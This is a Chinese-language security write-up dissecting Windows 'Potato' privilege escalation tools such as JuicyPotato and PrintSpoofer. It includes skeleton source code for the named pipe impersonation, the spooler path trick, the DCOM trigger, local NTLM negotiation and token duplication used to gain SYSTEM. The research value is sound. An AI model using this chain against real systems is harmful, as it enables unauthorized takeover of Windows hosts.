---
title: Potato家族本地提权
layout: post
featured-img: potato
summary: 对Potato家族(Potato/RottenPotato/JuicyPotato/PrintSpoofer/RoguePotato)滥用SeImpersonate特权本地提权细节的研究
---

```
首发于先知社区
```

## Feature or vulnerability

该提权手法的前提是拥有`SeImpersonatePrivilege`或`SeAssignPrimaryTokenPrivilege`权限，以下用户拥有`SeImpersonatePrivilege`权限（而只有更高权限的账户比如SYSTEM才有`SeAssignPrimaryTokenPrivilege`权限）：

- 本地管理员账户（不包括管理员组普通账户）和本地服务帐户
- 由SCM启动的服务

**P.s. 本机测试时即使在本地策略中授予管理员组普通用户`SeImpersonatePrivilege`特权，在cmd.exe中`whoami /priv`也不显示该特权，且无法利用；而`SeAssignPrimaryTokenPrivilege `特权则可以正常授予普通用户**

Windows服务的登录账户

> 1. Local System(**NT AUTHORITY\System**)
>    - It has the highest level of permissions on the local system.
>    - If the client and the server are both in a domain, then the **Local System** account uses the PC account (**hostname$**) to login on the remote computer.
>    - If the client or the server is not in a domain, then the **Local System** account uses **ANONYMOUS LOGON**.
> 2. Network Service(**NT AUTHORITY\Network Service**)
>    - It has permissions as an unpriviledge normal user on the local system.
>    - When accessing the network, it behaves the same as the **Local System** account.
> 3. Local Service(**NT AUTHORITY\Local Service**)
>    - It has permissions as an unpriviledge normal user on the local system.
>    - It always uses **ANONYMOUS LOGON**, whether a computer is in a domain or not.

也就是说该提权是

+ Administrator -> SYSTEM
+ Service -> SYSTEM

服务账户在Windows权限模型中本身就拥有很高的权限，所以微软不认为这是一个漏洞

但理论还得结合实际，实际渗透时是很有用的。常见场景下，拿到IIS的WebShell，或通过SQLi执行`xp_cmdshell`，此时手里的服务账户在进行操作时等同于是个低权限账户，而使用该提权手法可以直接获取SYSTEM权限

## SeImpersonate & SeAssignPrimaryToken Privilege

> if you have SeAssignPrimaryToken or SeImpersonatePrivilege, you are SYSTEM

Windows的token是描述安全上下文的对象，用户登录系统后就会生成token，创建新进程或新线程时这个token会被不断拷贝

Token成员：

```
用户账户的(SID)
用户所属的组的SID
用于标识当前登陆会话的登陆SID
用户或用户组所拥有的权限列表
所有者SID
所有者组的SID
访问控制列表
访问令牌的来源
主令牌/模拟令牌
限制SID的可选列表
模拟等级:
       Anonymous: server无法模拟或识别client
       Identification: 可识别client的身份和特权，不能模拟
       Impersonation: 可在本地系统模拟
       Delegation: 可在远程系统上模拟
```



```
C:\WINDOWS\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                                 State  
=============================== =========================================== =======
SeAssignPrimaryTokenPrivilege   Replace a process level token               Enabled
SeImpersonatePrivilege          Impersonate a client after authentication   Enabled
```

`CreateProcessWithTokenW`签名

```c++
WINADVAPI
_Must_inspect_result_ BOOL
WINAPI
CreateProcessWithTokenW(
    _In_        HANDLE hToken,
    _In_        DWORD dwLogonFlags,
    _In_opt_    LPCWSTR lpApplicationName,
    _Inout_opt_ LPWSTR lpCommandLine,
    _In_        DWORD dwCreationFlags,
    _In_opt_    LPVOID lpEnvironment,
    _In_opt_    LPCWSTR lpCurrentDirectory,
    _In_        LPSTARTUPINFOW lpStartupInfo,
    _Out_       LPPROCESS_INFORMATION lpProcessInformation
      );
```

当用户具有`SeImpersonatePrivilege`特权，则可以调用`CreateProcessWithTokenW`以某个Token的权限启动新进程

`CreateProcessAsUserW`签名

```c++
WINADVAPI
BOOL
WINAPI
CreateProcessAsUserW(
    _In_opt_ HANDLE hToken,
    _In_opt_ LPCWSTR lpApplicationName,
    _Inout_opt_ LPWSTR lpCommandLine,
    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_ BOOL bInheritHandles,
    _In_ DWORD dwCreationFlags,
    _In_opt_ LPVOID lpEnvironment,
    _In_opt_ LPCWSTR lpCurrentDirectory,
    _In_ LPSTARTUPINFOW lpStartupInfo,
    _Out_ LPPROCESS_INFORMATION lpProcessInformation
    );
```

当用户具有`SeAssignPrimaryTokenPrivilege`特权，则可以调用`CreateProcessAsUserW`以指定用户权限启动新进程

为什么会有一系列`Impersonate`函数，微软本意是让高权限服务端可以模拟低权限客户端来执行操作以提高安全性，但被攻击者反向使用了

## How to get a high-privilege token

Potato家族使用了一系列的手段

### Origin Potato

repo: https://github.com/foxglovesec/Potato

最初的Potato是WPAD或LLMNR/NBNS投毒（细节部分还需要使用DNS exhaust的手段来使DNS解析失败从而走广播LLMNR/NBNS），让某些高权限系统服务请求自己监听的端口，并要求NTLM认证，然后relay到本地的SMB listener

这个提权其实跟今天要讲的关系不大，因为它本质是个跨协议(HTTP -> SMB)的reflection NTLM relay

一方面relay攻击对有SMB签名的系统无效，且之后微软通过在lsass中缓存来缓解relay回自身的攻击

### RottenPotato & JuicyPotato

repo: https://github.com/ohpe/juicy-potato

这两种不同于初始的Potato，它是通过DCOM call来使服务向攻击者监听的端口发起连接并进行NTLM认证

Rotten Potato和Juicy Potato几乎是同样的原理，后者在前者的基础上完善，所以后文细节部分就以JuicyPotato来讲

> When a DCOM object is passed to an out of process COM server the object reference is marshalled in an OBJREF stream. For marshal-by-reference this results in an OBJREF_STANDARD stream being generated which provides enough information to the server to locate the original object and bind to it. Along with the identity for the object is a list of RPC binding strings (containing a TowerId and a string). This can be abused to connect to an arbitrary TCP port when an unmarshal occurs by specifying the tower as NCACN_IP_TCP and a string in the form “host[port]”. When the object resolver tries to bind the RPC port it will make a TCP connection to the specified address and if needed will try and do authentication based on the security bindings.
>
> If we specify the NTLM authentication service in the bindings then the authentication will use basic NTLM. We just need to get a privileged COM service to unmarshal the object, we could do this on a per-service basis by finding an appropriate DCOM call which takes an object, however we can do it generically by abusing the activation service which takes a marshalled IStorage object and do it against any system service (such as BITS).

从project-zero扒来的图

![](http://eddieivan01.github.io/assets/img/dcom.png)

JuicyPotato通过传递BITS的CLSID和IStorage对象实例给`CoGetInstanceFromIStorage`函数，使rpcss激活BITS服务，随后rpcss的DCOM OXID resolver会解析序列化数据中的[OBJREF](https://msdn.microsoft.com/en-us/library/cc226828.aspx)拿到DUALSTRINGARRAY字段，该字段指定了`host[port]`格式的location，绑定对象时会向其中的`host[port]`发起DCE/RPC（Distributed Computing Environment）请求。这个`host[port]`由攻击者监听的，如果攻击者要求NTLM身份验证，高权限服务就会发送net-NTLM进行认证

看到这里是不是觉得好像和Potato差不多，依然是NTLM relay的套路，只是换了种让高权限服务请求我们的方式。其实JuicyPotato后面的操作也不同，它拿到net-NTLM后会通过SSPI的`AcceptSecurityContext`函数进行本地NTLM协商，最终拿到一个高权限的impersonation级别token，然后通过`CreateProcessWithTokenW`来启动新进程

另外，我们知道NTLM是个嵌入协议，DCOM调用发送的是DCE/RPC协议。我们只需要处理内部的NTLM SSP部分，所以该POC在本地NTLM协商的同时还会同时relay到本机的RPC 135端口来获取当前系统合法的RPC报文，后面的过程就只需要替换RPC报文中的NTLM SSP部分即可

DCOM协议文档：https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0

### PrintSpoofer (or PipePotato or BadPotato)

你问我它为啥有三个名字？最初公开POC的老外叫它`PrintSpoofer`，之后360的paper叫它`PipePotato`，然后GitHub一个国人的POC又叫它`BadPotato`（争夺冠名权？），尊重第一个公开POC的作者，后文叫它`PrintSpoofer`

该POC是2020.5公开的，它是通过Windows named pipe的一个API: `ImpersonateNamedPipeClient`来模拟高权限客户端的token（还有类似的`ImpersonatedLoggedOnUser`，`RpcImpersonateClient`函数），调用该函数后会更改当前线程的安全上下文（其实已经不是什么新技术了）

> The **ImpersonateNamedPipeClient** function allows the server end  of a named pipe to impersonate the client end. When this function is  called, the named-pipe file system changes the thread of the calling [process](https://docs.microsoft.com/en-us/windows/win32/SecGloss/p-gly) to start impersonating the [security context](https://docs.microsoft.com/en-us/windows/win32/SecGloss/s-gly) of the last message read from the pipe. Only the server end of the pipe can call this function.

这个POC有趣的地方在于，它利用了打印机组件路径检查的BUG，使SYSTEM权限服务能连接到攻击者创建的named pipe

`spoolsv.exe`服务有一个公开的RPC服务，里面有以下函数

```c++
DWORD RpcRemoteFindFirstPrinterChangeNotificationEx( 
    /* [in] */ PRINTER_HANDLE hPrinter,
    /* [in] */ DWORD fdwFlags,
    /* [in] */ DWORD fdwOptions,
    /* [unique][string][in] */ wchar_t *pszLocalMachine,
    /* [in] */ DWORD dwPrinterLocal,
    /* [unique][in] */ RPC_V2_NOTIFY_OPTIONS *pOptions)
```

`pszLocalMachine`参数需要传递UNC路径，传递`\\127.0.0.1`时，服务器会访问`\\127.0.0.1\pipe\spoolss`，但这个管道已经被系统注册了，如果我们传递`\\127.0.0.1\pipe`则因为路径检查而报错

但当传递`\\127.0.0.1/pipe/foo`时，校验路径时会认为`127.0.0.1/pipe/foo`是主机名，随后在连接named pipe时会对参数做标准化，将`/`转化为`\`，于是就会连接`\\127.0.0.1\pipe\foo\pipe\spoolss`，攻击者就可以注册这个named pipe从而窃取client的token

***

这个POC启动新进程是使用`CreateProcessAsUser`而不是`CreateProcessWithToken`

作者使用`AsUser`而不是`WithToken`的原因和我猜的一样，用`CreateProcessAsUserW`是为了能在当前console执行，做到interactive。我测试时就发现了传递给`CreateProcessWithToken`的`lpEnvironment`参数似乎被忽略了，永远会启动新console，作者在issue里说这是个bug

只有前面调用`ImpersonateNamedPipeClient`时需要`SeImpersonatePrivilege`特权，调用成功线程切换到SYSTEM安全上下文，此时调用`CreateProcessAsUserW`时caller和authticator是相同的，就不需要`SeAssignPrimaryTokenPrivilege`权限

理论是这样，但实际上我在Windows Server 2012 r2的DC上测试时，域内LocalSystem登录账户是`hostname$`，该账户没有`SeAssignPrimaryTokenPrivilege`，EXP返回1314 error（提给作者的issue: https://github.com/itm4n/PrintSpoofer/issues/1）

之后作者增加了一层check，当`CreateProcessAsUser`失败后会fallback回`CreateProcessWithToken`，不过`CreateProcessWithToken`无法做到interactive

### RoguePotato

repo: https://github.com/antonioCoco/RoguePotato

这个也是利用了命名管道

微软修补后，高版本Windows DCOM解析器不允许OBJREF中的DUALSTRINGARRAY字段指定端口号。为了绕过这个限制并能做本地令牌协商，作者在一台远程主机上的135端口做流量转发，将其转回受害者本机端口，并写了一个恶意RPC OXID解析器

> RPC支持的协议
>
> https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/472083a9-56f1-4d81-a208-d18aef68c101
>
> | RPC transport               | RPC protocol sequence string                                 |
> | --------------------------- | ------------------------------------------------------------ |
> | SMB                         | ncacn_np (see section [2.1.1.2](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/7063c7bd-b48b-42e7-9154-3c2ec4113c0d)) |
> | TCP/IP (both IPv4 and IPv6) | ncacn_ip_tcp (see section [2.1.1.1](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/95fbfb56-d67a-47df-900c-e263d6031f22)) |
> | UDP                         | ncadg_ip_udp (see section [2.1.2.1](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/f3c9d073-1563-4d47-861a-14023ec4990e)) |
> | SPX                         | ncacn_spx (see section [2.1.1.3](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/c3d5e5db-29a5-48b1-943a-b980c32a405c)) |
> | IPX                         | ncadg_ipx (see section [2.1.2.2](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/b48e594e-4af5-45a4-9742-5403cce18aef)) |
> | NetBIOS over IPX            | ncacn_nb_ipx (see section [2.1.1.4](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/6037c78a-e132-422b-b902-14377a964c2b)) |
> | NetBIOS over TCP            | ncacn_nb_tcp (see section [2.1.1.5](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/f50c8f33-9f1c-4761-aea8-10f6754c747b)) |
> | NetBIOS over NetBEUI        | ncacn_nb_nb (see section [2.1.1.6](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/f5f3fef2-cfdf-4e61-96a7-5a283784042c)) |
> | AppleTalk                   | ncacn_at_dsp (see section [2.1.1.7](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/54fcafab-410d-4c2e-a269-c0297b3e236b)) |
> | RPC over HTTP               | ncacn_http (see section [2.1.1.8](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/fb1a1d67-0180-429c-a059-6a95e71f9ce5)) |

但作者实践过程中发现ncacn_ip_tcp返回的是识别令牌，之后受到PrintSpoofer启发，使用`ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]`让RPCSS连接

不出网的情况下就只能在内网打下一台，相比之下有些局限

作者paper：https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/

### SweetPotato

repo: https://github.com/CCob/SweetPotato

COM/WinRM/Spoolsv的集合版，也就是Juicy/PrintSpoofer

WinRM的方法是作者文章https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/中提到的，当WinRM在当前系统未启用时，攻击者监听本机5985端口，BITS服务会向WinRM 5985发起NTLM认证

## Details

我希望掌握POC的细节，所以会结合代码分析`PrintSpoofer`和`JuicyPotato`内部的：

+ `CreateProcessWithTokenW` & `CreateProcessAsUserW`
+ Named pipe  `ImpersonateNamedPipeClient`
+ 触发DCOM call -- `CoGetInstanceFromIStorage`
+ SSPI本地NTLM协商 -- `AcceptSecurityContext`

为了突出重点，后面代码会删除错误处理，参数处理等，只保留骨干

### PrintSpoofer

主函数中的流程非常清晰

```c++
// 探测是否存在SeImpersonatePrivilege，并enable
CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME);

// 生成随机UUID作pipe name
GenerateRandomPipeName(&pwszPipeName);

// 创建named pipe
// 这个管道是异步的(OVERLAPPED I/O)，
// 因为内部调用CreateNamedPipe创建时设置了FILE_FLAG_OVERLAPPED
hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName);

// 调用named pipe server的ConnectNamedPipe等待client连接
// 创建event并返回，后面用来做同步(异步回调)
hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe);

// 创建新线程，调用RpcOpenPrinter连接named pipe
hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName);

// 等待spoolsv连接
dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);

// ImpersonateNamedPipeClient + CreateProcessAsUserW
GetSystem(hSpoolPipe);
```

#### CheckAndEnablePrivilege

`CheckAndEnablePrivilege`中首先获取当前进程token

调用了两次`GetTokenInformation`，这是win32api编程的惯例，第一次传递的LPVOID为NULL，此时会返回`ERROR_INSUFFICIENT_BUFFER`，函数会将所需的buffer大小写入`ReturnLength`参数指向的地址（`&dwTokenPrivilegesSize`），这样就可以获知所需的buffer大小并动态分配了

```c++
OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);

if (!GetTokenInformation(hToken, TokenPrivileges, NULL, dwTokenPrivilegesSize, &dwTokenPrivilegesSize)) {
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        wprintf(L"GetTokenInformation() failed. Error: %d\n", GetLastError());
        goto cleanup;
    }
}

pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwTokenPrivilegesSize);
if (!pTokenPrivileges)
    goto cleanup;

if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwTokenPrivilegesSize, &dwTokenPrivilegesSize)) {
    wprintf(L"GetTokenInformation() failed. Error: %d\n", GetLastError());
    goto cleanup;
}
```

后面遍历了token的所有privilege并查询所需的是否存在，查询到后会调用`AdjustTokenPrivileges`启用

```c++
AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
```

#### CreateSpoolNamedPipe

`CreateSpoolNamedPipe`创建命名管道，先创建了安全描述符，设置允许任何客户端访问

```c++
InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL);
```

后面创建named pipe时设置了`FILE_FLAG_OVERLAPPED`，也就是Windows中OVERLAPPED I/O的概念

为什么是OVERLAPPED，它的意思是CPU操作和I/O操作可以重叠，其实也就是异步I/O。这个模型是对每个I/O操作创建一个新线程，性能较差，所以Windows后面有了IOCP

```c++
StringCchPrintf(pwszPipeFullname, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\spoolss", pwszPipeName);
hPipe = CreateNamedPipe(pwszPipeFullname, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);
```

`CreateNamedPipe`的签名

```c++
WINBASEAPI
HANDLE
WINAPI
CreateNamedPipeW(
    _In_ LPCWSTR lpName,
    _In_ DWORD dwOpenMode,
    _In_ DWORD dwPipeMode,
    _In_ DWORD nMaxInstances,
    _In_ DWORD nOutBufferSize,
    _In_ DWORD nInBufferSize,
    _In_ DWORD nDefaultTimeOut,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes
    );
```

`ConnectSpoolNamedPipe`启动了named pipe server的accept，创建event并传递。正常情况下`ConnectNamedPipe`是个阻塞操作，但前文设置了OVERLAPPED I/O，故会直接返回，操作是否完成直接查询event即可

```c++
OVERLAPPED ol = { 0 };
hPipeEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
ol.hEvent = hPipeEvent;
ConnectNamedPipe(hPipe, &ol)
```

#### TriggerNamedPipeConnection

`TriggerNamedPipeConnection`创建新线程，调用`RpcRemoteFindFirstPrinterChangeNotificationEx`连接named pipe

```c++
CreateThread(NULL, 0, TriggerNamedPipeConnectionThread, pwszPipeName, 0, &dwThreadId);

// TriggerNamedPipeConnectionThread
StringCchPrintf(pwszTargetServer, MAX_PATH, L"\\\\%ws", pwszComputerName);
StringCchPrintf(pwszCaptureServer, MAX_PATH, L"\\\\%ws/pipe/%ws", pwszComputerName, pwszPipeName);

RpcTryExcept
{
    if (RpcOpenPrinter(pwszTargetServer, &hPrinter, NULL, &devmodeContainer, 0) == RPC_S_OK)
    {
        RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, pwszCaptureServer, 0, NULL);
        RpcClosePrinter(&hPrinter);
    }
}
RpcExcept(EXCEPTION_EXECUTE_HANDLER);
{
    // Expect RPC_S_SERVER_UNAVAILABLE
}
RpcEndExcept;
```

接着等待5s，然后调用`GetSystem`

#### ImpersonateNamedPipeClient

`GetSystem`中

首先调用`ImpersonateNamedPipeClient`，调用成功后当前**线程**的安全上下文切换为client token的安全上下文

```c++
ImpersonateNamedPipeClient(hPipe);
```

注意切换的是线程的上下文，所以这里调用`CreateProcess`还是用原进程的上下文

> CreateProcessA function
>
> Creates a new process and its primary thread. The new process runs in the security context of the calling process.
>
> If the calling process is impersonating another user, the new process uses the token for the calling process, not the impersonation token. To run the new process in the security context of the user represented by  the impersonation token, use the [CreateProcessAsUser](https://docs.microsoft.com/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) or [CreateProcessWithLogonW](https://docs.microsoft.com/windows/desktop/api/winbase/nf-winbase-createprocesswithlogonw) function.

接着获取当前线程安全上下文的令牌

```c++
OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken);
```

#### DuplicateTokenEx

复制一个新的，使用了`DuplicateTokenEx`创建primary令牌，如果是`DuplicateToken`的话只能创建impersonation令牌，后面就不能调用`CreateProcessAsUser`了

为什么要复制令牌，一方面是需要primary令牌，另一方面`CreateProcessXXX`的第一个入参必须有以下权限`TOKEN_QUERY, TOKEN_DUPLICATE, TOKEN_ASSIGN_PRIMARY`，通过`DuplicateToken`直接赋予复制的令牌`ALL_ACCESS`

```c++
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup);
```

如果通过CLI传递了sessionID的话，就在指定的session中开启新进程，高版本Windows中通过`qwinsta`查看

```c++
if (g_dwSessionId)
    SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD));
```

下面这一段做了一些创建新进程的细节配置，删掉也能执行

`WinSta0\\Default`是交互window station唯一的名字

```c++
dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;
GetSystemDirectory(pwszCurrentDirectory, MAX_PATH);
CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE);

STARTUPINFO si = { 0 };
si.cb = sizeof(STARTUPINFO);
si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
```

#### CreateProcessAsUserW & CreateProcessWithTokenW

最后调用`CreateProcessAsUserW`启动新进程

```c++
CreateProcessAsUserW(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, g_bInteractWithConsole, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi);
```

调用`CreateWithTokenW`也是一样

```c++
CreateProcessWithTokenW(hSystemTokenDup, 0, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi)
```

配置项一下几个必填，`CreateProcessWithTokenW`必定会启动新console，在某些操作时非常不方便，解决的话只能创建父子进程间的匿名管道接收输出（比如T00ls上WebShell版JuicyPotato就是这个原理）

```c++
CreateProcessAsUserW(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
CreateProcessWithTokenW(hSystemTokenDup, 0, NULL, g_pwszCommandLine, 0, NULL, NULL, &si, &pi);
```

### JuicyPotato

JuicyPotato的流程相对更复杂

```c++
PotatoAPI* test = new PotatoAPI();

// 创建新线程监听，处理COM service的NTLM认证过程
test->startCOMListenerThread();

// 创建新线程同时中继到RPC
test->startRPCConnectionThread();
test->triggerDCOM();


// 获取当前进程token
OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);

// enable privilege
EnablePriv(hToken, SE_IMPERSONATE_NAME);
EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);

// 通过SecurityContext获取access token
QuerySecurityContextToken(test->negotiator->phContext, &elevated_token);

// 复制token
DuplicateTokenEx(
    elevated_token,
    TOKEN_ALL_ACCESS,
    NULL,
    SecurityImpersonation,
    TokenPrimary,
    &duped_token);

if (*processtype == 't' || *processtype == '*')
    CreateProcessWithTokenW(duped_token, 0, processname, processargs, 0, NULL, NULL, &si, &pi);

if (*processtype == 'u' || *processtype == '*')
    CreateProcessAsUserW(duped_token, processname, command, nullptr, nullptr, FALSE, 0, nullptr, L"C:\\", &si, &pi);

```

#### PotatoAPI类定义

```c++
class PotatoAPI {
private:
	BlockingQueue<char*>* comSendQ;
	BlockingQueue<char*>* rpcSendQ;
	static DWORD WINAPI staticStartRPCConnection(void * Param);
	static DWORD WINAPI staticStartCOMListener(void * Param);
	static int newConnection;
	int processNtlmBytes(char* bytes, int len);
	int findNTLMBytes(char * bytes, int len);

public:
	PotatoAPI(void);
	int startRPCConnection(void);
    DWORD startRPCConnectionThread();
	DWORD startCOMListenerThread();
	int startCOMListener(void);
	int triggerDCOM();
	LocalNegotiator *negotiator;
	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;
	SOCKET ConnectSocket = INVALID_SOCKET;
};
```

#### startCOMListener

开启新线程监听COM server端口，默认随机

WinSock编程, 设置了端口复用，然后bind and listen；用select做多路复用

```c++
WSAStartup(MAKEWORD(2, 2), &wsaData);

struct addrinfo hints;
hints.ai_family = AF_INET;
hints.ai_socktype = SOCK_STREAM;
hints.ai_protocol = IPPROTO_TCP;
hints.ai_flags = AI_PASSIVE;

getaddrinfo(NULL, dcom_port, &hints, &result);
ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval));

bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
listen(ListenSocket, SOMAXCONN);

select(ListenSocket + 1, &fds, NULL, NULL, &timeout);
if (FD_ISSET(ListenSocket, &fds))
    ClientSocket = accept(ListenSocket, NULL, NULL);
```

accept到client后做NTLM认证，常规的循环recv结构

先调用`processNtlmBytes`做本地协商

```c++
iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);

// 处理NTLM type1 ~ type3
processNtlmBytes(recvbuf, iResult);
```

`processNtlmBytes`中调用`findNTLMBytes`找到RPC报文中NTLMSPP header的起始偏移（就是一个直白的子串匹配）

然后调用negotiator成员handle NTLM message，后文详细讲

```c++
switch (messageType) {
    case 1:
        //NTLM type 1 message
        negotiator->handleType1(bytes + ntlmLoc, len - ntlmLoc);
        break;
    case 2:
        //NTLM type 2 message
        negotiator->handleType2(bytes + ntlmLoc, len - ntlmLoc);
        break;
    case 3:
        //NTLM type 3 message
        negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
        break;
    default:
        ...
}
```

接下来是中继过程，需要将COM service发来的数据中继到RPC端口

连接RPC的socket在`startRPCConnection`操作，两个线程间用了两个send queue通讯，所以这里将对RPC socket的`send/recv`转化为`push(rpcSendQ)/pop(comSendQ)`

发送后阻塞等待接收RPC响应报文

```c++
rpcSendQ->push((char*)&iResult);
rpcSendQ->push(recvbuf);

int* len = (int*)comSendQ->wait_pop();
sendbuf = comSendQ->wait_pop();
```

依旧接收到后处理NTLM认证，一般来说这里是type2。处理完后回发给client

```c++
processNtlmBytes(sendbuf, *len);
iSendResult = send(ClientSocket, sendbuf, *len, 0);
```

结束一轮循环，这里的细节作者给了注释

```c++
//Sometimes Windows likes to open a new connection instead of using the current one
//Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
newConnection = checkForNewConnection(&ListenSocket, &ClientSocket);
```

#### startRPCConnection

开启新线程来连接本机RPC 135PORT

```c++
ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
```

这个线程就单纯做了COM service到RPC的中继转发

```c++
rpcSendQ->wait_pop();
sendbuf = rpcSendQ->wait_pop();

send(ConnectSocket, sendbuf, *len, 0);
recv(ConnectSocket, recvbuf, recvbuflen, 0);
```

#### triggerDCOM & IStorageTrigger

```c++
// 在当前线程初始化COM库，并将并发模型标识为单线程
CoInitialize(nullptr);

// 创建复合文件存储对象，该对象实现了IStorage接口
CreateILockBytesOnHGlobal(NULL, true, &lb);
StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);
```

IStorage接口的定义，文件内的层次存储结构，storage相当于directory，stream相当于file

> The **IStorage** interface supports the creation and management of  structured storage objects. Structured storage allows hierarchical  storage of information within a single file, and is often referred to as "a file system within a file". Elements of a structured storage object  are storages and streams. Storages are analogous to directories, and  streams are analogous to files. Within a structured storage there will  be a primary storage object that may contain substorages, possibly  nested, and streams. Storages provide the structure of the object, and  streams contain the data, which is manipulated through the [IStream](https://docs.microsoft.com/windows/desktop/api/objidl/nn-objidl-istream) interface.
>
> The **IStorage** interface provides methods for creating and managing the root storage object, child storage objects, and stream objects. These  methods can create, open, enumerate, move, copy, rename, or delete the  elements in the storage object.

接着new一个IStorageTrigger对象，该对象把stg包装了一层，实现了IStorage和IMarshal接口

```c++
IStorageTrigger* t = new IStorageTrigger(stg);
```

重点看`IStorageTrigger::MarshalInterface`，该方法返回序列化后的数据，此处写入RPC绑定字符串，来使COM Service连接我们COM Server

这一串操作是在把ascii字符串转成UTF16并计算转换后长度，我寻思为啥不用`MultiByteToWideChar`

```c++
unsigned short str_bindlen = ((strlen(ipaddr) + port_len + 2) * 2) + 6;
unsigned short total_length = (str_bindlen + sec_len) / 2;
unsigned char sec_offset = str_bindlen / 2;
port_len = port_len * 2;

byte *dataip;
int len = strlen(ipaddr) * 2;
dataip = (byte *)malloc(len);
for (int i = 0; i < len; i++) {
    if (i % 2)
        dataip[i] = *ipaddr++;
    else
        dataip[i] = 0;
}

byte *data_3;
data_3 = (byte *)malloc((port_len));
byte *strport = (byte *)&dcom_port[0];

for (int i = 0; i < (port_len); i++) {
    if (i % 2)
        data_3[i] = *strport++;
    else
        data_3[i] = 0;
}
```

后面就是生成序列化数据，并调用入参IStream的Write方法写入，IStorage序列化细节我就不细究了

回到`triggerDCOM`函数，调用`CoGetInstanceFromIStorage`加载BITS对象，将激活BITS服务器并序列化`IStorageTrigger`对象传递，内部的OXID resolver会连接指定的RPC绑定地址，并进行NTLM认证

```c++
CLSID clsid;
CLSIDFromString(olestr, &clsid);
CLSID tmp;
//IUnknown IID
CLSIDFromString(OLESTR("{00000000-0000-0000-C000-000000000046}"), &tmp);
MULTI_QI qis[1];
qis[0].pIID = &tmp;
qis[0].pItf = NULL;
qis[0].hr = 0;

HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);
```

#### LocalNegotiator::handleType1

整个协商过程就是两次调用SSPI的`AcceptSecurityContext`：https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-acceptsecuritycontext

`AcquireCredentialsHandle`获取security principal中预先存在的凭据句柄，`InitializeSecurityContext`和`AcceptSecurityContext`需要此句柄

```c++
AcquireCredentialsHandle(NULL, lpPackageName, SECPKG_CRED_INBOUND, NULL, NULL, 0, NULL, &hCred, &ptsExpiry);
```

